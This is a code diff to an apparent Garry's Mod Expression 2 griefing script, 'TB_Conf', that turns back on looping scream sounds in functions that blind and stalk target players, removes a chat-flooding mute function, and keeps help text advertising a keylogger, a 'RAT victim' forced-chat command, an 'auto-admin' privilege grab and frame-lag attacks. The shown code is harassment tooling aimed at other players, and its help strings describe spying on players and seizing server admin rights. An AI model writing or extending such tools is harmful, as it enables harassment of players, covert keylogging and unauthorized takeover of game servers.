@@ -1,8 +1,10 @@
 @name TB_Conf_v1_2
 @inputs 
 @outputs 
-@persist [Holos, Count, I, Run]:number TargPly:entity [Target, KTarget, ChatStr]:string
+@persist [Holos, Count, I, Run]:number TargPly:entity [Target, KTarget, ChatStr, Aids]:string
 @strict
+
+Aids = "stop"
 
 function ps(PN:string, Msg:string){
     NStr = ""
@@ -76,7 +78,7 @@ function blind(TargName:string, Run:number){
             holoColor(Bl, vec(0,0,0))
             
             for(I=1, 100, 1){
-                #Blinder:emitSound("Town.d1_town_02a_fz_scream1")
+                Blinder:emitSound("Town.d1_town_02a_fz_scream1")
                 
                 if(Run == 0){
                     I = 100
@@ -103,7 +105,7 @@ function blind(TargName:string, Run:number){
             holoColor(P, vec(0,0,0))
             
             for(I=1, 100, 1){
-                #Blinder:emitSound("Town.d1_town_02a_fz_scream1")
+                Blinder:emitSound("Town.d1_town_02a_fz_scream1")
                 
                 if(Run == 0){
                     I = 100
@@ -129,7 +131,7 @@ function jump(TargName:string){
         
         while(1 & perf(100)){
             holoPos(J, Targ:pos())
-            #Jmp:emitSound("Town.d1_town_02a_fz_scream1")
+            Jmp:emitSound("Town.d1_town_02a_fz_scream1")
         }
     }
     
@@ -141,31 +143,9 @@ function jump(TargName:string){
             Jmp = holoEntity(P)
             
             while(1 & perf(100)){
-                #Jmp:emitSound("Town.d1_town_02a_fz_scream1")
+                Jmp:emitSound("Town.d1_town_02a_fz_scream1")
             }
         }
-    }
-}
-
-function mute(Run:number){
-    Fun = ""
-    if(Run == 1){
-        print("\n[TB]: Muting chat . . . ")
-        for(X=1, 10*Run, 1){
-            Fun += "\n":repeat(X)
-            
-            modifyChat(Fun)
-            X++
-            
-            if(Run == 0){
-                break
-            }
-        }
-    }
-    else{
-        print("\n[TB]: Chat unmuted.")
-        X = 0
-        Fun = ""
     }
 }
 
@@ -184,8 +164,7 @@ function tbhelp(){
             - _tbx_run aids | [BETA] ULX auto-admin.
             - _tbx_run_say {msg:string} |[BETA] Forces RAT victim to\n              send chat message."
     
-    Body4= "            - _tbx_keylog {target:string} | Keylogger. Prints to console.
-            - _mute {run:number} | Bombs chat with newlines.\n              Basically a server mute."
+    Body4= "            - _tbx_keylog {target:string} | Keylogger. Prints to console."
     
     Footer = "\n***[Additional Features]***\n"
     Foot1 = "            - R to start frame lag.
